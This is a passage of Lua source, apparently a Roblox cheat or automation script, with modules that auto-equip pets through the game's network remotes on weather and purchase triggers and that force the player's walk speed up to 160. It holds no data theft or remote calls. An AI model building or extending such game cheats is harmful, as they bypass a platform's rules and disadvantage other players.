	end,
	GetOwnedGamepasses = function()
		return y.LocalPlayer:GetAttribute("OwnedGamepasses") or ""
	end;
	GetPlotId = function()
		return y.LocalPlayer:GetAttribute("PlotId") or 0
	end,
	GetPrimeEnabled = function()
		return y.LocalPlayer:GetAttribute("PrimeEnabled") or false
	end;
	GetSecondTimePlayer = function()
		return y.LocalPlayer:GetAttribute("SecondTimePlayer") or false
	end,
	GetStarterPackExpiresAt = function()
		return y.LocalPlayer:GetAttribute("StarterPackExpiresAt") or 0
	end
}
Z.Player = {
	Rejoin = function()
		pcall(function()
			y.TeleportService:Teleport(game.PlaceId)
		end)
	end;
	CameraSetUp = function()
		pcall(function()
			y.LocalPlayer.CameraMaxZoomDistance = 350
		end)
	end,
	GetUserid = function()
		return y.LocalPlayer.UserId
	end,
	GetTool_Holding = function()
		return y.Character and y.Character:FindFirstChildWhichIsA("Tool")
	end;
	IsToolHeld = function(G)
		local V = Z.Player.GetTool_Holding()
		if not V then
			return false
		end
		return V == G
	end,
	UnequipTools = function()
		local G = y.Character
		if not G then
			return false
		end
		local V = G:FindFirstChildOfClass("Humanoid")
		if not V then
			return
		end
		V:UnequipTools()
	end;
	EquipTool = function(G)
		local V = y.Character
		if not V or not G then
			return false
		end
		local Z = V:FindFirstChildOfClass("Humanoid")
		if not Z then
			return false
		end
		local j, i = pcall(function()
			Z:EquipTool(G)
		end)
		if not j then
			warn("\226\157\140 Failed to equip tool:", i)
			return false
		end
		return true
	end
}
g.PetTriggersV2StatusText = ""
g.PetTriggersV2UiState = g.PetTriggersV2UiState or {}
g.PetTriggersV2LastPetBuy = g.PetTriggersV2LastPetBuy or {}
Z.PetTriggersV2 = {
	StartedPetTriggersV2 = false;
	BusyPetTriggersV2 = false;
	ActiveRuleIdPetTriggersV2 = "",
	ActiveSignaturePetTriggersV2 = "",
	PetBuyActiveSecondsPetTriggersV2 = g.PetAndSeedTravelTimeoutSeconds;
	RulePriorityPetTriggersV2 = {
		["Pet Buy"] = 90;
		["Time Cycle"] = 70,
		Default = 10
	},
	SizeRankPetTriggersV2 = {
		Huge = 3,
		Big = 2,
		Normal = 1
	};
	VariantRankPetTriggersV2 = {
		Rainbow = 2,
		Normal = 1
	};
	CategoryPetsPetTriggersV2 = {
		Speed = {
			"Bunny"
		},
		Growth = {
			"Deer"
		},
		Seed = {
			"Robin"
		}
	},
	SetStatusPetTriggersV2 = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.PetTriggersV2StatusText = ""
			return false
		end
		g.PetTriggersV2StatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\144\135 [Pet Triggers v2]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
		return true
	end,
	NormalisePetTriggersV2 = function(G)
		return ((tostring(G or "")):lower()):gsub("%s+", "")
	end,
	IsSelectionEmptyPetTriggersV2 = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V == true or type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
		end
		return true
	end,
	ForEachSelectionPetTriggersV2 = function(G, V)
		if type(G) ~= "table" or type(V) ~= "function" then
			return false
		end
		local y = {}
		for G, j in pairs(G) do
			local i = tostring(j == true and G or j or "")
			local c = Z.PetTriggersV2.NormalisePetTriggersV2(i)
			if i ~= "" and (c ~= "" and not y[c]) then
				y[c] = true
				if V(i) == true then
					return true
				end
			end
		end
		return false
	end;
	GetRulesTablePetTriggersV2 = function()
		if type(h.pet_triggers_v2_rules) ~= "table" then
			h.pet_triggers_v2_rules = {}
		end
		return h.pet_triggers_v2_rules
	end;
	NewRuleIdPetTriggersV2 = function()
		local G = Z.PetTriggersV2.GetRulesTablePetTriggersV2()
		for V = 1, 20, 1 do
			local y = "ptv2_" .. tostring(math.random(100000, 999999))
			if not G[y] then
				return y
			end
		end
		return "ptv2_" .. (tostring(os.time()) .. ("_" .. tostring(math.random(100000, 999999))))
	end,
	GetEventColourPetTriggersV2 = function(G)
		local V = (tostring(G or "")):lower()
		if V:find("blood", 1, true) then
			return "#FF5555"
		end
		if V:find("gold", 1, true) then
			return "#FFD700"
		end
		if V:find("rainbow", 1, true) then
			return "#FF55FF"
		end
		if V:find("mega", 1, true) then
			return "#AA66FF"
		end
		if V:find("moon", 1, true) then
			return "#66CCFF"
		end
		if V:find("rain", 1, true) then
			return "#55DDEE"
		end
		if V:find("night", 1, true) then
			return "#9999FF"
		end
		if V:find("day", 1, true) then
			return "#FFFFAA"
		end
		return "#FFFFFF"
	end,
	GetEventTextPetTriggersV2 = function(G)
		G = tostring(G or "")
		return string.format("<font color=\'%s\'>%s</font>", Z.PetTriggersV2.GetEventColourPetTriggersV2(G), G)
	end,
	GetEventDropdownPetTriggersV2 = function()
		local G, V = {}, {}
		local function y(y)
			y = tostring(y or "")
			local j = Z.PetTriggersV2.NormalisePetTriggersV2(y)
			if y == "" or y == "Any Time" or j == "" or V[j] then
				return false
			end
			V[j] = true
			table.insert(G, {
				Text = Z.PetTriggersV2.GetEventTextPetTriggersV2(y),
				Value = y
			})
			return false
		end
		if Z.WeatherTriggers and type(Z.WeatherTriggers.GetOptionsWeatherTriggers) == "function" then
			for G, V in ipairs(Z.WeatherTriggers.GetOptionsWeatherTriggers()) do
				y(V)
			end
		end
		for G, V in ipairs(Z.PetTriggersV2.GetSortedRulesPetTriggersV2()) do
			Z.PetTriggersV2.ForEachSelectionPetTriggersV2(V.events, y)
		end
		table.sort(G, function(G, V)
			return tostring(G.Value or "") < tostring(V.Value or "")
		end)
		return G
	end;
	ResolvePetNamePetTriggersV2 = function(G)
		G = tostring(G or "")
		if G == "" then
			return "", ""
		end
		if type(y.PetData) == "table" and type(y.PetData[G]) == "table" then
			return G, tostring(y.PetData[G].DisplayName or G)
		end
		local V = g.PetDataFast and g.PetDataFast[G]
		if type(V) == "table" and type(V.petname) == "string" then
			return V.petname, tostring(V.displayname or V.petname)
		end
		if type(y.PetData) == "table" then
			local V = Z.PetTriggersV2.NormalisePetTriggersV2(G)
			for G, y in pairs(y.PetData) do
				local j = type(y) == "table" and tostring(y.DisplayName or G) or tostring(G)
				if Z.PetTriggersV2.NormalisePetTriggersV2(G) == V or Z.PetTriggersV2.NormalisePetTriggersV2(j) == V then
					return tostring(G), j
				end
			end
		end
		return G, G
	end,
	GetPetDisplayNamePetTriggersV2 = function(G)
		local V, y = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(G)
		return y ~= "" and y or V
	end;
	GetPetRarityPetTriggersV2 = function(G, V)
		local Z = type(y.PetData) == "table" and y.PetData[tostring(G or "")] or nil
		if type(Z) == "table" and type(Z.Rarity) == "string" then
			return Z.Rarity
		end
		if type(V) == "table" and type(V.Rarity) == "string" then
			return V.Rarity
		end
		return "Unknown"
	end;
	GetPetSizePetTriggersV2 = function(G)
		local V = type(G) == "table" and ((G.Size or G.PetSize)) or nil
		return ((V == "Huge" or V == "Big")) and V or "Normal"
	end,
	GetPetVariantPetTriggersV2 = function(G)
		local V = type(G) == "table" and ((G.Type or G.PetType)) or nil
		return type(V) == "string" and (V ~= "" and V) or "Normal"
	end,
	GetPetDropdownPetTriggersV2 = function()
		local G, V = {}, {}
		for y, j in ipairs(g.PetDataTable or {}) do
			local i = tostring(j.petname or "")
			if i ~= "" and not V[i] then
				V[i] = true
				local y = tostring(j.displayname or i)
				local c = tostring(j.rarity or "Unknown")
				table.insert(G, {
					Text = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'%s\'>%s</font>", y, Z.Data.GetRarityColor(c), c);
					Value = i
				})
			end
		end
		table.sort(G, function(G, V)
			return tostring(G.Text or "") < tostring(V.Text or "")
		end)
		return G
	end,
	GetEquippedIdsPetTriggersV2 = function()
		local G = {}
		local V = y.Networking and (y.Networking.Pets and y.Networking.Pets.GetEquippedPets)
		if not V or type(V.Fire) ~= "function" then
			return G
		end
		local Z, j = pcall(function()
			return V:Fire()
		end)
		if not Z or type(j) ~= "table" then
			return G
		end
		for V, y in pairs(j) do
			if type(y) == "table" then
				local Z = tostring(y.Id or y.id or y.PetId or y.UUID or y.uuid or V or "")
				if Z ~= "" then
					G[Z] = true
				end
			elseif type(y) == "string" then
				G[y] = true
			end
		end
		return G
	end,
	GetPetToolInfoPetTriggersV2 = function(G, V)
		if not G or not G:IsA("Tool") then
			return nil
		end
		local y = G:GetAttribute("Pet")
		local j = G:GetAttribute("PetId")
		j = type(j) == "string" and j or tostring(j or "")
		if type(y) ~= "string" or y == "" or j == "" then
			return nil
		end
		local i, c = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(y)
		local J = {
			Size = G:GetAttribute("PetSize"),
			Type = G:GetAttribute("PetType")
		}
		return {
			id = j;
			key = j,
			name = i;
			displayName = c;
			rarity = Z.PetTriggersV2.GetPetRarityPetTriggersV2(i, J),
			size = Z.PetTriggersV2.GetPetSizePetTriggersV2(J);
			variant = Z.PetTriggersV2.GetPetVariantPetTriggersV2(J),
			equipped = type(V) == "table" and V[j] == true or false;
			tool = G;
			data = J
		}
	end;
	SortPetsPetTriggersV2 = function(G, V)
		local y = Z.PetTriggersV2.SizeRankPetTriggersV2[tostring(G.size or "Normal")] or 1
		local j = Z.PetTriggersV2.SizeRankPetTriggersV2[tostring(V.size or "Normal")] or 1
		if y ~= j then
			return y > j
		end
		local i = Z.PetTriggersV2.VariantRankPetTriggersV2[tostring(G.variant or "Normal")] or 1
		local c = Z.PetTriggersV2.VariantRankPetTriggersV2[tostring(V.variant or "Normal")] or 1
		if i ~= c then
			return i > c
		end
		local J = g.RarityRank[tostring(G.rarity or "")] or 0
		local T = g.RarityRank[tostring(V.rarity or "")] or 0
		if J ~= T then
			return J > T
		end
		return tostring(G.id or "") < tostring(V.id or "")
	end,
	GetInventoryPetsPetTriggersV2 = function()
		local G = Z.PetTriggersV2.GetEquippedIdsPetTriggersV2()
		local V, j = {}, {}
		for y, i in ipairs({
			y.Backpack,
			y.Character
		}) do
			if i and i.Parent then
				for y, i in ipairs(i:GetChildren()) do
					local c = Z.PetTriggersV2.GetPetToolInfoPetTriggersV2(i, G)
					if c and not j[c.id] then
						j[c.id] = true
						table.insert(V, c)
					end
				end
			end
		end
		local i = Z.DataReplica.GetData("Inventory")
		local c = type(i) == "table" and i.Pets or nil
		if type(c) == "table" then
			for y, i in pairs(c) do
				if type(i) == "table" then
					local c = tostring(i.Id or i.PetId or y or "")
					if c ~= "" and not j[c] then
						local J, T = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(i.Name or i.Pet or i.Species or i.PetName or "")
						if J ~= "" then
							j[c] = true
							table.insert(V, {
								id = c;
								key = tostring(y),
								name = J;
								displayName = T;
								rarity = Z.PetTriggersV2.GetPetRarityPetTriggersV2(J, i),
								size = Z.PetTriggersV2.GetPetSizePetTriggersV2(i);
								variant = Z.PetTriggersV2.GetPetVariantPetTriggersV2(i);
								equipped = G[c] == true;
								data = i
							})
						end
					end
				end
			end
		end
		table.sort(V, Z.PetTriggersV2.SortPetsPetTriggersV2)
		return V
	end,
	GetMaxSlotsPetTriggersV2 = function()
		local G = Z.PlayerData and (Z.PlayerData.GetMaxEquippedPets and Z.PlayerData.GetMaxEquippedPets()) or 3
		return math.max(math.floor(tonumber(G) or 3), 1)
	end;
	PetMatchesSpecPetTriggersV2 = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		local y = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(V.pet or V.name or "")
		if y == "" or tostring(G.name or "") ~= y then
			return false
		end
		if tostring(V.size or "") ~= "" and tostring(G.size or "Normal") ~= tostring(V.size) then
			return false
		end
		if tostring(V.variant or "") ~= "" and tostring(G.variant or "Normal") ~= tostring(V.variant) then
			return false
		end
		return true
	end,
	PetMatchesCategoryPetTriggersV2 = function(G, V)
		V = tostring(V or "")
		local y = Z.PetTriggersV2.CategoryPetsPetTriggersV2[V]
		if type(G) ~= "table" or type(y) ~= "table" then
			return false
		end
		local j = Z.PetTriggersV2.NormalisePetTriggersV2(G.name)
		local i = Z.PetTriggersV2.NormalisePetTriggersV2(G.displayName)
		for G, V in ipairs(y) do
			local y, c = Z.PetTriggersV2.ResolvePetNamePetTriggersV2(V)
			if j == Z.PetTriggersV2.NormalisePetTriggersV2(y) or i == Z.PetTriggersV2.NormalisePetTriggersV2(c) then
				return true
			end
		end
		return V == "Speed" and i:find("bunny", 1, true) ~= nil or V == "Growth" and i:find("deer", 1, true) ~= nil or V == "Seed" and i:find("robin", 1, true) ~= nil
	end;
	BuildSelectionPetTriggersV2 = function(G)
		local V = Z.PetTriggersV2.GetInventoryPetsPetTriggersV2()
		local y = Z.PetTriggersV2.GetMaxSlotsPetTriggersV2()
		local j, i = {}, {}
		local c = tostring(G.loadoutMode or "Manual")
		local J = ((c == "Speed" or c == "Growth" or c == "Seed")) and c or nil
		if J then
			for G, V in ipairs(V) do
				if # j >= y then
					break
				end
				if Z.PetTriggersV2.PetMatchesCategoryPetTriggersV2(V, J) then
					table.insert(j, V)
				end
			end
			return j, y
		end
		local T = 0
		for G, c in ipairs(type(G.pets) == "table" and G.pets or {}) do
			local J = math.max(math.floor(tonumber(c.amount) or 1), 1)
			for G = 1, J, 1 do
				T += 1
				if # j >= y then
					break
				end
				for G, V in ipairs(V) do
					local y = tostring(V.id or "")
					if y ~= "" and (not i[y] and Z.PetTriggersV2.PetMatchesSpecPetTriggersV2(V, c)) then
						i[y] = true
						table.insert(j, V)
						break
					end
				end
			end
		end
		return j, T
	end,
	BuildSignaturePetTriggersV2 = function(G, V)
		local y = {
			tostring(G and G.id or "")
		}
		for G, V in ipairs(type(V) == "table" and V or {}) do
			table.insert(y, tostring(V.id or V.key or ""))
		end
		return table.concat(y, "|")
	end,
	WaitForPetStatePetTriggersV2 = function(G, V, y)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local j = os.clock() + math.max(tonumber(y) or 1, .2)
		repeat
			local y = Z.PetTriggersV2.GetEquippedIdsPetTriggersV2()
			if ((y[G] == true)) == V then
				return true
			end
			task.wait(.1)
		until os.clock() >= j
		return false
	end,
	EquipPetPetTriggersV2 = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.id or G.key or "")
		if V == "" then
			return false
		end
		if G.equipped then
			return true
		end
		local j = G.tool
		if j and (j.Parent and (y.Character and j.Parent ~= y.Character)) then
			local G = y.Character:FindFirstChildOfClass("Humanoid")
			if G then
				pcall(function()
					G:EquipTool(j)
				end)
				task.wait(.15)
			end
		end
		local i = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestToggleFollower)
		local c = i and (type(i.Fire) == "function" and pcall(function()
			i:Fire(V)
		end))
		if not c and (j and (j.Parent and type(j.Activate) == "function")) then
			c = pcall(function()
				j:Activate()
			end)
		end
		return c == true and Z.PetTriggersV2.WaitForPetStatePetTriggersV2(V, true, 2) or false
	end;
	UnequipPetPetTriggersV2 = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		local V = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestUnequip)
		local j = V and (type(V.Fire) == "function" and pcall(function()
			V:Fire(G)
		end))
		if not j then
			local V = y.Networking and (y.Networking.Pets and y.Networking.Pets.RequestToggleFollower)
			j = V and (type(V.Fire) == "function" and pcall(function()
				V:Fire(G)
			end))
		end
		return j == true and Z.PetTriggersV2.WaitForPetStatePetTriggersV2(G, false, 2) or false
	end,
	ApplyRulePetTriggersV2 = function(G)
		if type(G) ~= "table" or Z.PetTriggersV2.BusyPetTriggersV2 then
			return false
		end
		Z.PetTriggersV2.BusyPetTriggersV2 = true
		local V = false
		local y, j = pcall(function()
			local y, j = Z.PetTriggersV2.BuildSelectionPetTriggersV2(G)
			local i = Z.PetTriggersV2.BuildSignaturePetTriggersV2(G, y)
			local c = tostring(G.id or "")
			if j <= 0 then
				Z.PetTriggersV2.SetStatusPetTriggersV2("No pets selected", "#FFCC66")
				return
			end
			if # y == 0 then
				Z.PetTriggersV2.SetStatusPetTriggersV2("No matching pets found", "#FF6666")
				return
			end
			if i == Z.PetTriggersV2.ActiveSignaturePetTriggersV2 and c == Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 then
				Z.PetTriggersV2.SetStatusPetTriggersV2("Active " .. Z.PetTriggersV2.GetShortSummaryPetTriggersV2(G), "#7CFC00")
				V = true
				return
			end
			local J = {}
			for G, V in ipairs(y) do
				J[tostring(V.id or "")] = true
			end
			for G, V in ipairs(Z.PetTriggersV2.GetInventoryPetsPetTriggersV2()) do
				local y = tostring(V.id or "")
				if V.equipped and (y ~= "" and not J[y]) then
					Z.PetTriggersV2.UnequipPetPetTriggersV2(y)
					task.wait(.1)
				end
			end
			local T = Z.PetTriggersV2.GetEquippedIdsPetTriggersV2()
			for G, V in ipairs(y) do
				local y = tostring(V.id or "")
				if y ~= "" and not T[y] then
					Z.PetTriggersV2.EquipPetPetTriggersV2(V)
					task.wait(.1)
				end
			end
			Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = c
			Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = i
			Z.PetTriggersV2.SetStatusPetTriggersV2("Applied " .. Z.PetTriggersV2.GetShortSummaryPetTriggersV2(G), "#66CCFF")
			V = true
		end)
		Z.PetTriggersV2.BusyPetTriggersV2 = false
		if not y then
			Z.PetTriggersV2.SetStatusPetTriggersV2("Apply failed", "#FF6666")
			warn("[PetTriggersV2]", j)
			return false
		end
		return V
	end,
	GetRuleActivePetTriggersV2 = function(G)
		if type(G) ~= "table" or G.enabled ~= true then
			return false
		end
		local V = tostring(G.triggerType or "Default")
		if V == "Default" then
			return true
		end
		if V == "Pet Buy" then
			local G = type(g.PetTriggersV2LastPetBuy) == "table" and g.PetTriggersV2LastPetBuy or nil
			if type(G) ~= "table" or G.active ~= true then
				return false
			end
			if os.clock() >= ((tonumber(G.expiresAt) or 0)) then
				g.PetTriggersV2LastPetBuy = {}
				return false
			end
			return true
		end
		if V == "Time Cycle" then
			if Z.PetTriggersV2.IsSelectionEmptyPetTriggersV2(G.events) then
				return false
			end
			return Z.PetTriggersV2.ForEachSelectionPetTriggersV2(G.events, function(G)
				return Z.WeatherTriggers and Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(G) == true
			end)
		end
		return false
	end;
	GetSortedRulesPetTriggersV2 = function()
		local G = {}
		for V, y in pairs(Z.PetTriggersV2.GetRulesTablePetTriggersV2()) do
			if type(y) == "table" then
				y.id = tostring(y.id or V)
				table.insert(G, y)
			end
		end
		table.sort(G, function(G, V)
			local y = Z.PetTriggersV2.RulePriorityPetTriggersV2[tostring(G.triggerType or "")] or 0
			local j = Z.PetTriggersV2.RulePriorityPetTriggersV2[tostring(V.triggerType or "")] or 0
			if y ~= j then
				return y > j
			end
			local i = tonumber(G.createdAt) or 0
			local c = tonumber(V.createdAt) or 0
			if i ~= c then
				return i < c
			end
			return tostring(G.id or "") < tostring(V.id or "")
		end)
		return G
	end;
	GetBestRulePetTriggersV2 = function()
		for G, V in ipairs(Z.PetTriggersV2.GetSortedRulesPetTriggersV2()) do
			if Z.PetTriggersV2.GetRuleActivePetTriggersV2(V) then
				return V
			end
		end
		return nil
	end;
	ProcessPetTriggersV2 = function()
		local G = Z.TotalControl.ResolvePetTriggersEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = ""
				Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = ""
				Z.PetTriggersV2.SetStatusPetTriggersV2("")
				return false
			end
		else
			if h.pet_triggers_v2_enabled ~= true then
				Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = ""
				Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = ""
				Z.PetTriggersV2.SetStatusPetTriggersV2("")
				return false
			end
		end
		if not q.IsLoadingCompleted() then
			Z.PetTriggersV2.SetStatusPetTriggersV2("Waiting for loading", "#FFCC66")
			return false
		end
		local V = Z.TotalControl.ResolvePetTriggersRuleTotalControl() or Z.PetTriggersV2.GetBestRulePetTriggersV2()
		if type(V) == "table" then
			return Z.PetTriggersV2.ApplyRulePetTriggersV2(V)
		end
		Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = ""
		Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = ""
		Z.PetTriggersV2.SetStatusPetTriggersV2("Waiting for trigger", "#CFCFCF")
		return false
	end;
	StartPetBuyPetTriggersV2 = function(G, V)
		if type(G) ~= "table" then
			return nil
		end
		local y = tostring(os.clock()) .. ("_" .. tostring(math.random(100000, 999999)))
		g.PetTriggersV2LastPetBuy = {
			active = true;
			token = y;
			ref = V,
			name = tostring(G.displayName or G.name or "Pet"),
			expiresAt = os.clock() + Z.PetTriggersV2.PetBuyActiveSecondsPetTriggersV2
		}
		Z.PetTriggersV2.ProcessPetTriggersV2()
		return y
	end,
	StopPetBuyPetTriggersV2 = function(G, V)
		local y = type(g.PetTriggersV2LastPetBuy) == "table" and g.PetTriggersV2LastPetBuy or nil
		if type(y) ~= "table" or y.active ~= true then
			return false
		end
		if G ~= nil and (tostring(G or "") ~= "" and tostring(y.token or "") ~= tostring(G)) then
			return false
		end
		g.PetTriggersV2LastPetBuy = {}
		Z.PetTriggersV2.ProcessPetTriggersV2()
		return true
	end,
	MarkPetBuyPetTriggersV2 = function(G)
		return Z.PetTriggersV2.StartPetBuyPetTriggersV2(G)
	end,
	CleanEventsPetTriggersV2 = function(G)
		local V = {}
		Z.PetTriggersV2.ForEachSelectionPetTriggersV2(G, function(G)
			V[G] = true
			return false
		end)
		return V
	end;
	CleanPetsPetTriggersV2 = function(G)
		local V = {}
		for G, y in ipairs(type(G) == "table" and G or {}) do
			local j = type(y) == "table" and Z.PetTriggersV2.ResolvePetNamePetTriggersV2(y.pet or y.name or "") or ""
			local i = type(y) == "table" and math.clamp(math.floor(tonumber(y.amount) or 1), 1, 12) or 1
			if j ~= "" then
				table.insert(V, {
					pet = j;
					amount = i;
					size = tostring(y.size or "");
					variant = tostring(y.variant or "")
				})
			end
		end
		return V
	end;
	AddRulePetTriggersV2 = function(G, V, y, j)
		G = tostring(G or "Default")
		y = tostring(y or "Speed")
		if G ~= "Default" and (G ~= "Time Cycle" and G ~= "Pet Buy") then
			return false, "Invalid trigger"
		end
		if y ~= "Speed" and y ~= "Manual" then
			return false, "Invalid pet mode"
		end
		local i = Z.PetTriggersV2.CleanEventsPetTriggersV2(V)
		if G == "Time Cycle" and Z.PetTriggersV2.IsSelectionEmptyPetTriggersV2(i) then
			return false, "Select at least one event"
		end
		local c = {}
		if y == "Manual" then
			c = Z.PetTriggersV2.CleanPetsPetTriggersV2(j)
			if # c == 0 then
				return false, "Add at least one pet"
			end
		end
		local J = Z.PetTriggersV2.NewRuleIdPetTriggersV2();
		(Z.PetTriggersV2.GetRulesTablePetTriggersV2())[J] = {
			id = J;
			enabled = true,
			triggerType = G,
			events = i,
			loadoutMode = y;
			pets = c;
			createdAt = os.time()
		}
		a.Save.SaveData()
		if g.PetTriggersV2UiState.RefreshRulesPetTriggersV2 then
			g.PetTriggersV2UiState.RefreshRulesPetTriggersV2()
		end
		return true, J
	end;
	ToggleRulePetTriggersV2 = function(G, V)
		G = tostring(G or "")
		local y = (Z.PetTriggersV2.GetRulesTablePetTriggersV2())[G]
		if type(y) ~= "table" then
			return false
		end
		y.enabled = V == true
		if not y.enabled and Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 == G then
			Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = ""
			Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = ""
		end
		a.Save.SaveData()
		Z.PetTriggersV2.ProcessPetTriggersV2()
		return true
	end,
	RemoveRulePetTriggersV2 = function(G)
		G = tostring(G or "")
		local V = Z.PetTriggersV2.GetRulesTablePetTriggersV2()
		if type(V[G]) ~= "table" then
			return false
		end
		V[G] = nil
		if Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 == G then
			Z.PetTriggersV2.ActiveRuleIdPetTriggersV2 = ""
			Z.PetTriggersV2.ActiveSignaturePetTriggersV2 = ""
		end
		a.Save.SaveData()
		if g.PetTriggersV2UiState.RefreshRulesPetTriggersV2 then
			g.PetTriggersV2UiState.RefreshRulesPetTriggersV2()
		end
		Z.PetTriggersV2.ProcessPetTriggersV2()
		return true
	end;
	GetEventsTextPetTriggersV2 = function(G)
		local V = {}
		Z.PetTriggersV2.ForEachSelectionPetTriggersV2(type(G) == "table" and G.events or nil, function(G)
			table.insert(V, Z.PetTriggersV2.GetEventTextPetTriggersV2(G))
			return false
		end)
		return # V > 0 and table.concat(V, " + ") or "<font color=\'#CFCFCF\'>Any</font>"
	end;
	GetPetsTextPetTriggersV2 = function(G)
		if type(G) ~= "table" then
			return ""
		end
		if tostring(G.loadoutMode or "Speed") == "Speed" then
			return "<font color=\'#7CFC00\'>Speed: Bunny best-first</font>"
		end
		local V = {}
		for G, y in ipairs(type(G.pets) == "table" and G.pets or {}) do
			local j = Z.PetTriggersV2.GetPetDisplayNamePetTriggersV2(y.pet)
			local i = {}
			if tostring(y.size or "") ~= "" then
				table.insert(i, tostring(y.size))
			end
			if tostring(y.variant or "") ~= "" then
				table.insert(i, tostring(y.variant))
			end
			table.insert(V, string.format("%s x%d%s", j, math.max(math.floor(tonumber(y.amount) or 1), 1), # i > 0 and " [" .. (table.concat(i, ", ") .. "]") or ""))
		end
		return # V > 0 and table.concat(V, " + ") or "No pets"
	end;
	GetShortSummaryPetTriggersV2 = function(G)
		if type(G) ~= "table" then
			return "Invalid trigger"
		end
		local V = tostring(G.triggerType or "Default")
		local y = V == "Pet Buy" and "#FFAA00" or V == "Time Cycle" and "#66CCFF" or "#CFCFCF"
		return string.format("<font color=\'%s\'>%s</font> <font color=\'#FFFFFF\'>%s</font>", y, V, tostring(G.id or ""))
	end,
	GetRuleSummaryPetTriggersV2 = function(G)
		if type(G) ~= "table" then
			return "Invalid trigger"
		end
		local V = G.enabled == true and "<font color=\'#7CFC00\'>ON</font>" or "<font color=\'#FF6666\'>OFF</font>"
		local y = tostring(G.triggerType or "Default")
		local j = y == "Pet Buy" and "#FFAA00" or y == "Time Cycle" and "#66CCFF" or "#CFCFCF"
		local i = y == "Time Cycle" and Z.PetTriggersV2.GetEventsTextPetTriggersV2(G) or string.format("<font color=\'%s\'>%s</font>", j, y)
		return string.format("%s <font color=\'#FFFFFF\'>%s</font> \226\128\162 %s \226\128\162 %s", V, tostring(G.id or ""), i, Z.PetTriggersV2.GetPetsTextPetTriggersV2(G))
	end;
	StartPetTriggersV2 = function()
		if Z.PetTriggersV2.StartedPetTriggersV2 then
			return false
		end
		Z.PetTriggersV2.StartedPetTriggersV2 = true
		if y.Workspace then
			(y.Workspace:GetAttributeChangedSignal("ActivePhase")):Connect(function()
				Z.PetTriggersV2.ProcessPetTriggersV2()
			end);
			(y.Workspace:GetAttributeChangedSignal("ActiveWeather")):Connect(function()
				Z.PetTriggersV2.ProcessPetTriggersV2()
			end)
		end
		local G = Z.WeatherTriggers and (Z.WeatherTriggers.GetWeatherValuesWeatherTriggers and Z.WeatherTriggers.GetWeatherValuesWeatherTriggers())
		if G and (Z.WeatherTriggers and type(Z.WeatherTriggers.GetOptionsWeatherTriggers) == "function") then
			for V, y in ipairs(Z.WeatherTriggers.GetOptionsWeatherTriggers()) do
				if y ~= "Any Time" then
					(G:GetAttributeChangedSignal(y .. "_Playing")):Connect(function()
						Z.PetTriggersV2.ProcessPetTriggersV2()
					end)
				end
			end
		end
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(1)
				local G, V = pcall(Z.PetTriggersV2.ProcessPetTriggersV2)
				if not G then
					Z.PetTriggersV2.SetStatusPetTriggersV2("System error", "#FF6666")
					warn("[PetTriggersV2]", V)
				end
			end
		end)
		return true
	end
}
g.PlayerSpeedStatusText = ""
Z.PlayerSpeed = {
	Started = false,
	OriginalSpeed = nil;
	LastAppliedSpeed = nil,
	SetStatusPlayerSpeed = function(G, V)
		g.PlayerSpeedStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'%s\'>\226\154\161 Player Speed:</font> <font color=\'#FFFFFF\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or ""))
	end,
	GetHumanoidPlayerSpeed = function()
		local G = y.Character
		local V = G and G:FindFirstChildOfClass("Humanoid")
		if not V or V.Health <= 0 then
			return nil
		end
		return V
	end,
	ApplyPlayerSpeed = function()
		local G = Z.PlayerSpeed.GetHumanoidPlayerSpeed()
		if not G then
			g.PlayerSpeedStatusText = ""
			return false
		end
		if not h.player_speed_enabled then
			if Z.PlayerSpeed.OriginalSpeed and (Z.PlayerSpeed.LastAppliedSpeed and math.abs(G.WalkSpeed - Z.PlayerSpeed.LastAppliedSpeed) <= 1) then
				G.WalkSpeed = Z.PlayerSpeed.OriginalSpeed
			end
			Z.PlayerSpeed.OriginalSpeed = nil
			Z.PlayerSpeed.LastAppliedSpeed = nil
			g.PlayerSpeedStatusText = ""
			return false
		end
		local V = math.clamp(tonumber(h.player_speed_value) or 80, 16, 160)
		if not Z.PlayerSpeed.OriginalSpeed then
			Z.PlayerSpeed.OriginalSpeed = G.WalkSpeed
		end
		if G.WalkSpeed < V then
			G.WalkSpeed = V
			Z.PlayerSpeed.LastAppliedSpeed = V
		end
		Z.PlayerSpeed.SetStatusPlayerSpeed(string.format("Minimum %d \226\128\162 Current %d", V, math.floor(G.WalkSpeed + .5)), "#66CCFF")
		return true
	end,
	StartPlayerSpeed = function()
		if Z.PlayerSpeed.Started then
			return false
		end
		Z.PlayerSpeed.Started = true
		task.spawn(function()
			while true do
				task.wait(.25)
				Z.PlayerSpeed.ApplyPlayerSpeed()
			end
		end)
		return true
	end
}
